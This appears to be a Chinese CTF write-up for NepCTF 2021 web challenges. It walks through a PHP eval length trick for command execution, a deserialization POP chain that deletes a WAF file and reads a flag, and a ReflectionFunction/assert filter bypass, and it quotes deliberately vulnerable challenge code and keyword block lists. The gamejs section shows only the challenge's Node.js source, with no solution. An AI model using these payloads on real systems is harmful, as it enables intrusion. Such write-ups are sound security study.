---
title: Nepctf
author: Pp1ove
avatar: 'https://wx1.sinaimg.cn/large/006bYVyvgy1ftand2qurdj303c03cdfv.jpg'
authorLink: hojun.cn
authorAbout: 一个好奇的人
authorDesc: 一个好奇的人
categories: 技术
comments: true
date: 2021-03-22 20:09:44
tags:
keywords:
description:
photos:
---



**昵称:Pp1ove    比赛名次:151    分数 97** 

## little_trick

```php
<?php
    error_reporting(0);
    highlight_file(__FILE__);
    $nep = $_GET['nep'];
    $len = $_GET['len'];
    if(intval($len)<8 && strlen($nep)<13){
        eval(substr($nep,0,$len));
    }else{
        die('too long!');
    }
?>
```

```
截取了$nep的长度,可以使用$nep=`$nep`;XXX
$len=7
这样截取后就会变成 eval("`$nep`;");
$nep被解析,最终执行eval(``$nep`;XXX`);
然后我们可以随意修改XXX的值来执行命令,
但是这题对长度有限制,strlen($nep)<13
我们控制的XXX的长度就应该<5
执行命令ls>a ,可以将ls的输出输入到a文件里面
访问a文件,发现目录下有一个nepctf.php文件,
再用xz *命令进行打包,*会列出当前目录下的所有文件,下载nepctf.php.xz获得flag
```

## 梦里花开牡丹亭

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include('shell.php');
class Game{
    public  $username;
    public  $password;
    public  $choice;
    public  $register;

    public  $file;
    public  $filename;
    public  $content;
    
    public function __construct()
    {
        $this->username='user';
        $this->password='user';
    }

    public function __wakeup(){
        if(md5($this->register)==="21232f297a57a5a743894a0e4a801fc3"){
            $this->choice=new login($this->file,$this->filename,$this->content);
        }else{
            $this->choice = new register();
        }
    }
    public function __destruct() {
        $this->choice->checking($this->username,$this->password);
    }

}
class login{
    public $file;
    public $filename;
    public $content;

    public function __construct($file,$filename,$content)
    {
        $this->file=$file;
        $this->filename=$filename;
        $this->content=$content;
    }
    public function checking($username,$password)
    {
        if($username==='admin'&&$password==='admin'){
            $this->file->open($this->filename,$this->content);
            die('login success you can to open shell file!');
        }
    }
}
class register{
    public function checking($username,$password)
    {
        if($username==='admin'&&$password==='admin'){
            die('success register admin');
        }else{
            die('please register admin ');
        }
    }
}
class Open{
    function open($filename, $content){
        if(!file_get_contents('waf.txt')){
            shell($content);
        }else{
            echo file_get_contents($filename.".php");
        }
    }
}
if($_GET['a']!==$_GET['b']&&(md5($_GET['a']) === md5($_GET['b'])) && (sha1($_GET['a'])=== sha1($_GET['b']))){
    @unserialize(base64_decode($_POST['unser']));
}
```

简单的反序列化。。。。大概吧,一开始的pop链挺好构造的,

```php
class Game
{
    public $username;
    public $password;
    public $choice;
    public $register;

    public $file;
    public $filename;
    public $content;

    public function __construct()
    {
        $this->username = 'admin';
        $this->password = 'admin';
        $this->register = 'admin';
        $this->file = new Open();
        $this->filename = 'shell';
        $this->content = '';
    }

    public function __wakeup()
    {
        if (md5($this->register) === "21232f297a57a5a743894a0e4a801fc3") {
            $this->choice = new login($this->file, $this->filename, $this->content);
        }
    }

    public function __destruct()
    {
        $this->choice->checking($this->username, $this->password);
    }

}
class login
{
}
class register
{
}
class Open
{
}
$a = new Game();
var_dump($a);
echo base64_encode(serialize($a));
```

可以查看源代码读到shell.php文件,读php文件要看源代码!!!又给忘了,导致这里卡了半天没反应过来

```PHP
#shell.php
function shell($cmd){
    if(strlen($cmd)<10){       if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/',$cmd)){
            die("NO");
        }else{
            return system($cmd);
        }
    }else{
        die('so long!');
    }
}
```

接下来就需要进入

```php
class Open{
    function open($filename, $content){
        if(!file_get_contents('waf.txt')){
            echo $content;
            shell($content);
        }
    }
```

但是waf.txt文件时存在的呀,而且参数不可控制,直接把人给打昏了,然后又尝试了下file_get_contents配合伪协议,发现也不行,好叭,倒回去看一下前面是否有利用点,还有个file参数,尝试一下利用,这里利用php的内置类

,找一下又没有内置类里面有open方法

```php
<?php
$classes = get_declared_classes();
foreach ($classes as $class) {
    $methods = get_class_methods($class);
    foreach ($methods as $method) {
        if (in_array($method, array('open'))) {
            print $class . '::' . $method . "\n";
        }
    }
}
#找到了三个
SessionHandler::open
ZipArchive::open
XMLReader::open
```

去翻了一下官方文档,发现ZipArchive::open可以进行文件的overwrite,

直接构造

```php
file=new ZipArchive();

$this->filename = 'waf.txt';

$this->content = 8; //echo了一下,ZipArchive::OVERWRITE=8
```

成功删除了waf.txt (这里之前我content没有设置为8,设置的1,可能因为没有关闭文件的原因,后面payload一直打不通,删除不了文件,重启了一下环境就好了)

接下来就差最后一步了,执行命令

```bash
ls /   #发现根目录下的flag文件
/flag&>q  #发现q文件创起了,但是里面没有内容,本地测试了一下,发现格式为flag={xxx}确实不会报错,自己也还没搞清楚报错的原因
重新回到执行命令的思路上,对长度进行了限制,后面 空格/flag应该是固定的,就看前面的命令最多只有三个字符,n\l不就是三个字符吗?
用$content='n\l /flag'成功读取flag
```

最后附上exp

```php
<?php
class Game
{
    public $username;
    public $password;
    public $choice;
    public $register;

    public $file;
    public $filename;
    public $content;

    public function __construct()
    {
        $this->username = 'admin';
        $this->password = 'admin';
        $this->register = 'admin';
        $this->file = new Open();
        $this->filename = '';
        $this->content = 'n\l /flag';
    }

    public function __wakeup()
    {
        if (md5($this->register) === "21232f297a57a5a743894a0e4a801fc3") {
            $this->choice = new login($this->file, $this->filename, $this->content);
        }
    }

    public function __destruct()
    {
        $this->choice->checking($this->username, $this->password);
    }

}
class login
{
}
class register
{
}
class Open
{
}
$a = new Game();
var_dump($a);
echo base64_encode(serialize($a));
```

# 复现

## bbxhh

前面按着做就行了,因为封了ip需要不停换节点,然后主要弄下最后关键的代码(因为原题要不停换节点,就懒得弄了,直接把代码放到本地测试了)

```php
<?php function waf($s)
{
    return preg_replace('/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\/\/|>/i', "NepnEpneP", $s);
}

if (isset($_GET['a'])) {
    $_ = waf($_GET['a']);
    $__ = waf($_GET['b']);
    $a = new $_($__);
} else {
    $a = new Error('?');
}
if (isset($_GET['c']) && isset($_GET['d'])) {
    $c = waf($_GET['c']);
    $d = waf($_GET['d']);
    eval("\$a->$c($d);");
} else {
    $c = "getMessage";
    $d = "";
    eval("echo \$a->$c($d);");
}
```

看wp说的需要用到反射类,那就去学学

https://learnku.com/articles/7538/the-application-of-reflection-in-php

https://www.php.net/manual/zh/reflectionfunction.invokeargs.php

exp:

```PHP
<?php
function waf($s){
    return preg_replace('/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\/\/|>/i', "NepnEpneP", $s);
}
$a='ReflectionFunction';
$b='assert';
$c='invokeArgs';
$d="array('show_source(\"XXX.php\");')";

if(isset($a))
{
    $_ = waf($a);
    $__ = waf($b);
    $a = new $_($__);
}
else
{
    $a = new Error('?');
}
if(isset($c) && isset($d))
{
    $c = waf($c);
    $d = waf($d);
    eval("\$a->$c($d);");
}
else
{
    $c = "getMessage";
    $d = "";
    eval("echo \$a->$c($d);");
}
```

然后遇到了一个大坑,就是我直接F10运行会疯狂报错,结果我在浏览器上查看的时候又没有问题。是因为我本地的php环境为7.3,而assert函数被舍弃了一些功能

```php
PHP >= 5.4.8，description 可作为第四个参数提供给 ASSERT_CALLBACK 模式里的回调函数
在 PHP 5 中，参数 assertion 必须是可执行的字符串，或者运行结果为布尔值的表达式
在 PHP 7 中，参数 assertion 可以是任意表达式，并用其运算结果作为断言的依据
在 PHP 7 中，参数 exception 可以是个 Throwable 对象，用于捕获表达式运行错误或断言结果为失败。(当然 assert.exception 需开启)
PHP >= 7.0.0，支持 zend.assertions、assert.exception 相关配置及其特性
PHP >= 7.2 版本开始，参数 assertion 不再支持字符串
```

还有另一种解法

```php
$c='getMessage';
$d="eval('system(\"dir\");')";
```

这里$a=new Error('?');

然后$c为$a下任意一个方法,当执行时,会先执行eval('system(\\'dir\\');');  system会自动回显输出,然后再将system();的返回值传给getMessage方法,然后报错,但是system已经执行了,所以说后面报不报错已经无所谓了。

## gamejs

访问source获得源码

```javascript
var opn = require('opn');
var express = require('express');
var app = express();
var path = require('path');
var bodyParser = require('body-parser');
var highestScore = 40000;
var FUNCFLAG = '_$$ND_FUNC$$_';
var serialize_banner = '{"banner":"好，很有精神！"}';
var flag = {"flag":""} // flag是啥来着？记不清了。

function Record() {
    this.lastScore = 0;
    this.maxScore = 0;
    this.lastTime = null;
}
var validCode = function (func_code){
    let validInput = /subprocess|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base64|"|'|\[|\+|\*/ig;
    return !validInput.test(func_code);
};
var validInput = function (input) {
    let validInput = /subprocess|mainModule|from|process|child_process|main|require|exec|this|function|buffer/ig;
    ins = serialize(input);
    return !validInput.test(ins);
};
var merge = function (target, source) {
    try {
        for (let key in source) {
            if (typeof source[key] == 'object') {
                merge(target[key], source[key]);
            } else {
                target[key] = source[key];
            }
        }
    }
    catch (e) {
        console.log(e);
    }
};
var serialize = function (obj, ignoreNativeFunc, outputObj, cache, path) {
    path = path || '$';
    cache = cache || {};
    cache[path] = obj;
    outputObj = outputObj || {};
    if (typeof obj === 'string') {
      return JSON.stringify(obj);
    }
    var key;
    for (key in obj) {
      if (obj.hasOwnProperty(key)) {
        if (typeof obj[key] === 'function') {
          var funcStr = obj[key].toString();
          outputObj[key] = FUNCFLAG + funcStr;
        } else {
          outputObj[key] = obj[key];
        }
      }
    }
    return JSON.stringify(outputObj);
};
var unserialize = function(obj) {
    obj = JSON.parse(obj);
    if (typeof obj === 'string') {
      return obj;
    }
    var key;
    for(key in obj) {
      if(typeof obj[key] === 'string') {
        if(obj[key].indexOf(FUNCFLAG) === 0) {
          var func_code=obj[key].substring(FUNCFLAG.length);
          if (validCode(func_code)){
            var d = '(' + func_code + ')';
            obj[key] = eval(d);
          }
        }
      }
    }
    return obj;
};
app.use(bodyParser());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'views')));

app.use(function (req, res, next) {
    if (validInput(req.body)) {
        next();
    } else {
        res.status(403).send('Hacker!!!');
    }
});
async function index(req, res) {
    res.sendFile(path.resolve(__dirname, 'static/index.html'));
}
async function record(req, res, next) {
    new Promise(function (resolve, reject) {
        var record = new Record();
        var score = req.body.score;
        if (score.length < String(highestScore).length) {
            merge(record, {
                lastScore: score,
                maxScore: Math.max(parseInt(score),record.maxScore),
                lastTime: new Date().toString()
            });
            highestScore = highestScore > parseInt(score) ? highestScore : parseInt(score);
            if ((score - highestScore) < 0) {
                var banner = "不好，没有精神！";
            } else {
                var banner = unserialize(serialize_banner).banner;
            }
        }
        res.json({
            banner: banner,
            record: record
        });
    }).catch(function (err) {
        next(err)
    })
}

app.post('/record', record);
app.get('/', index);
app.get('/source', function (req, res) {
    opn('app.js').then(() => {
        res.sendFile(path.join(__dirname, 'app.js'));
    });
})
app.use(function (err, req, res, next) {
    console.log(err.stack);
    res.status(500).send('Some thing broke!')
});
app.listen('3000');
```







